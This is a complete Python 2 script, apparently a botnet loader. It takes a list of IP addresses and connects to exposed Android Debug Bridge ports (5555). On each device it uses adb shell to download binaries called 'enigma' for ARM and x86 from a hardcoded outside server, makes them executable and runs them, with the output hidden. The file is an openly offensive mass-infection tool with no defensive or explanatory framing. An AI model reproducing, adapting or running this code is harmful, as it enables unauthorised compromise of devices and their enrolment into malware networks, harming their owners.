import sys
import threading
import requests
import os
import socket
import time
from Queue import *
from threading import Thread
 
if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" <ip list>")

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
 
info = open(str(sys.argv[1]),'a+')
 
def adb(ip):
    ip = str(ip).rstrip("\n")
    try:
        adb = socket.socket()
        adb.settimeout(10)
        adb.connect((ip,5555))
        os.system("adb connect "+ip+" > /dev/null 2>&1")
        time.sleep(3);
        os.system("adb -s "+ip+":5555 shell \"cd /data/local/tmp; rm -rf lol; rm -rf lol2; curl -O lol http://45.148.10.202/bins/enigma.arm7; wget http://45.148.10.202/bins/enigma.arm7 -O lol; busybox wget http://45.148.10.202/bins/enigma.arm7 -O lol; curl -O lol2 http://45.148.10.202/bins/enigma.x86_32; wget http://45.148.10.202/bins/enigma.x86_32 -O lol2; busybox wget http://45.148.10.202/bins/enigma.x86_32 -O lol2; chmod 777 lol lol2; ./lol; ./lol2; exit\" > /dev/null 2>&1")
        print "LOADING: "+ip+""
        adb.close()
    except Exception:
        adb.close()
        pass
 

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        #sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=adb, args=(input,))
            thread.start()
            time.sleep(0.05)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()
